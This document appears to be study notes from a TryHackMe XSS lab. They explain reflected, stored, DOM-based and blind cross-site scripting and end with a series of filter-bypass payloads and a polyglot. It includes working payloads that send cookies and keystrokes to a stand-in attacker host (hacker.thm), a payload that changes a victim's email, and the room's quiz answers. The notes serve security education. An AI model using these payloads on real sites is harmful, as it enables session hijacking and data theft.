# Intro into Cross Site Scripting(XSS)

- XSS is based on JavaScript
- Malicious JavaScript gets injected into a web application with the intention of being executed by other users

## What is Payload?
-  It is the JavaScript code we wish to be executed on the targets computer
- There are two parts to the payload
    - the intention 
        - what you wish the JavaScript to actually do
    - the modification
        - Changes to the code we need to make it execute as every scenario is different

- Some Examples
    - Simplest payload
        ```
        <script>alert('XSS');</script>
        ```
    - Session Stealing
        ```
        <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
        ```
    - Key logger
        ```
        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
        ```
    - Business Logic
        ```
        <script>user.changeEmail('attacker@hacker.thm');</script>
        ```

**Which document property could contain the user's session token?**
- document.cookie

**Which JavaScript method is often used as a Proof Of Concept?**
- alert


##  1. Reflected XSS
- Occurs when user-supplied data in an http request is included in the webpage source without any validation.

    ![Screenshot](/images/reflectedxss.png)

    ![Screenshot](/images/reflectedxss1.png)

**How to test for Reflected XSS?**
- You'll need to test every possible point of entry; these include:
    - Parameters in the URL Query String
    - URL File Path
    - Sometimes HTTP Headers (although unlikely exploitable in practice)

**Potential Impact**
- Could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information. 


## 2. Stored XSS
- XSS payload is stored on the web application (database) and then gets run when other users visit the site or web page

    ![Screenshot](/images/storedxss.png)

**Potential Impact**
- Could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
**How to Check this XSS?**
- Test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
    - Comments on a blog
    - User profile information
    - Website Listings


## 3. DOM based XSS
- DOM stands for Document Object Model and is a programming interface for HTML and XML documents
- In DOM XSS, JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code
- Website's JS gets the contents from the **window.location.hash** parameter and then writes that onto the page in the currently being viewed section. 
- The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

**Potential Impact**
- Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

**How to test for Dom Based?**
- DOM Based can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
- When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


## Blind XSS
- It is similar to a stored XSS
- You can't see the payload working or be able to test it against yourself first

- **Example**
    - A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal. 

**Potential Impact**
- Make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal. 


- When testing for Blind vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request)


## Perfecting your payload
1. **Level 1**
    ```
    <script>alert('THM');</script>
    ```

    ![Screenshot](/images/level1.png)

2. **Level 2**
    ```
    "><script>alert('THM');</script>
    ```

    ![Screenshot](/images/level2.png)

3. **Level 3**
    ```
    </textarea><script>alert('THM');</script>
    ```

    ![Screenshot](/images/level3.png)

4. **Level 4**
    ```
    ';alert('THM');//
    ```

    ![Screenshot](/images/level4.png)

5. **Level 5**
    ```
    <sscriptcript>alert('THM');</sscriptcript>
    ```

    ![Screenshot](/images/level5.png)

6. **Level 6**
    ```
    "><img src=Defronix onerror=alert(1)>//
    ```
    OR  
    ```
    /images/cat.jpg" onload="alert('THM');
    ```

    ![Screenshot](/images/level6.png)


## Polyglots
- An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one
- Simple example
    ```
    /*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
    ```
    